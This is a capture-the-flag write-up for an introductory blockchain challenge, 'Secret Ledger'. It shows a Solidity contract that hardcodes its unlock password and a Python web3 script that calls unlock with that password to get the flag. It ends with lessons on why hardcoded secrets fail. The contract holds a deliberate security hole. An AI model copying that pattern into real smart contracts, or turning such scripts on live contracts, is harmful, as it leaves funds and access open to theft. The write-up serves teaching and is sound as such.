# Secret Ledger

**Category:** Web3/Blockchain
**Points:** 100
**Difficulty:** Intro

## Challenge Description

Connect to the blockchain instance and unlock the secret ledger.

## Solution

### Step 1: Connect to the Challenge

Connect to the TCP endpoint to spawn a blockchain instance:

```
nc 51.210.244.18 61026
```

This provides:
- RPC URL for the blockchain
- Private key for transactions
- Player address
- Challenge contract address

### Step 2: Analyze the Contract

Looking at `SecretLedger.sol`, the contract has a simple unlock mechanism:

```solidity
contract SecretLedger {
    bool public unlocked;

    function unlock(string memory password) public {
        require(keccak256(abi.encodePacked(password)) ==
                keccak256(abi.encodePacked("MilleniumSecretBlockchain")));
        unlocked = true;
    }
}
```

The password is hardcoded right in the source code: `MilleniumSecretBlockchain`

### Step 3: Exploit Script

```python
from web3 import Web3
from eth_account import Account

# Connection details from challenge
RPC_URL = "http://51.210.244.18:8545/..."
PRIVATE_KEY = "0x..."
CHALLENGE_ADDR = "0x..."

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)

# ABI for unlock function
abi = [{"inputs":[{"name":"password","type":"string"}],
        "name":"unlock","outputs":[],"type":"function"}]

contract = w3.eth.contract(address=CHALLENGE_ADDR, abi=abi)

# Call unlock with the password from source
tx = contract.functions.unlock("MilleniumSecretBlockchain").build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})

signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
w3.eth.wait_for_transaction_receipt(tx_hash)

print("Unlocked!")
```

### Step 4: Get the Flag

After the transaction confirms, return to the TCP connection and request the flag.

## Key Takeaways

- Always check source code for hardcoded secrets
- Keccak256 comparison with a known plaintext is not a security mechanism
- "Security through obscurity" doesn't work when source is available

## Flag

`HACKDAY{...}`
